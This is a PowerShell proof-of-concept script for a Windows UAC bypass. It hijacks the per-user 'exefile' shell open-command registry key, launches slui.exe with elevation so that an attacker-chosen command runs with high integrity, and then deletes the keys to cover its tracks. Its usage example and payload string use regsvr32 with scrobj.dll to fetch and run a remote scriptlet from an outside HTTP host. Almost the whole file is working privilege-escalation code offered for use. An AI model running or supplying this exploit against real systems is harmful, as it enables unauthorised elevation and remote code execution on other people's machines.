<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via SluiFileHandlerHijackLPE
.NOTES
	Function   : SluiHijackBypass
	File Name  : SluiHijackBypass.ps1
	Author     : Gushmazuko
.LINK
	https://github.com/gushmazuko/tools/blob/master/SluiHijackBypass.ps1
	Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
.EXAMPLE
	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll":
	SluiHijackBypass -http "http://192.168.0.10/runner.cst"
#>

function SluiHijackBypass(){
	Param (
	
		[String]$http
	)
	
	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"

	#Create registry structure
	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
		#In Windows x64
		Start-Process "C:\Windows\System32\slui.exe" -Verb runas

		#In Windows x86
		#C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\slui.exe -Verb runas

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
}
